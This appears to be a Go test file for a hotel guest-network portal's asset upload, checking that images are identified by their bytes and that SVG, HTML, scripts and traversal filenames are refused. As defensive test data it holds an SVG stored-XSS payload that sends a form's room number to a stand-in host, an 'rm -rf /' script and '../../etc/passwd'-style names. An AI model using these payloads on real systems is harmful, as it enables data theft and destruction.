package main

// PORTAL ASSET UPLOAD, held to the rule that makes it safe.
//
// This directory is served unauthenticated to every device on the guest network BEFORE sign-in. It is the
// most exposed surface the appliance has, and the page it decorates collects room numbers, surnames and
// voucher codes. So what may be stored there is decided by inspecting the bytes, never by trusting a
// filename or a Content-Type the uploader chose.

import "testing"

func TestAssetTypeIsDecidedByTheBytes(t *testing.T) {
	png := append([]byte{0x89, 'P', 'N', 'G', 0x0D, 0x0A, 0x1A, 0x0A}, make([]byte, 40)...)
	jpg := append([]byte{0xFF, 0xD8, 0xFF, 0xE0}, make([]byte, 40)...)
	gif := append([]byte("GIF89a"), make([]byte, 40)...)
	webp := append(append([]byte("RIFF"), []byte{0, 0, 0, 0}...), append([]byte("WEBP"), make([]byte, 40)...)...)

	for name, b := range map[string][]byte{"png": png, "jpeg": jpg, "gif": gif, "webp": webp} {
		if ext, mime := sniffImage(b); ext == "" || mime == "" {
			t.Errorf("a real %s was not recognised", name)
		}
	}
}

func TestAssetUploadRefusesSVG(t *testing.T) {
	// SVG IS THE ONE THAT MATTERS. It is XML, browsers execute script inside it when it loads as a document,
	// and it arrives looking exactly like a logo. An uploadable SVG on this page is stored XSS against the
	// guest's credentials.
	svg := []byte(`<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('//x/'+document.forms[0].room.value)</script></svg>`)
	if ext, _ := sniffImage(svg); ext != "" {
		t.Fatal("an SVG was accepted as an image")
	}
}

func TestAssetUploadRefusesContentThatIsNotAnImage(t *testing.T) {
	for name, b := range map[string][]byte{
		"html":          []byte(`<html><body onload="steal()">`),
		"a script":      []byte("#!/bin/sh\nrm -rf /\n"),
		"png extension": []byte("this is not a png, it just claims to be"),
		"empty":         {},
	} {
		if ext, _ := sniffImage(b); ext != "" {
			t.Errorf("%s was accepted as an image", name)
		}
	}
}

func TestStoredAssetNamesAreGeneratedNotSupplied(t *testing.T) {
	// The stored name is content-addressed here, so an operator's filename -- which can contain a path, a
	// traversal or a second extension -- never reaches the filesystem or the served URL.
	for _, bad := range []string{
		"../../etc/passwd", "logo.png.sh", "a/b.png", "..\\windows\\x.png", "", "logo.svg",
	} {
		if regexpAssetName.MatchString(bad) {
			t.Errorf("%q would have been accepted as a stored asset name", bad)
		}
	}
	for _, good := range []string{"0123456789abcdef.png", "fedcba9876543210.jpg", "00112233aabbccdd.webp"} {
		if !regexpAssetName.MatchString(good) {
			t.Errorf("%q is the shape this handler generates and was rejected", good)
		}
	}
}
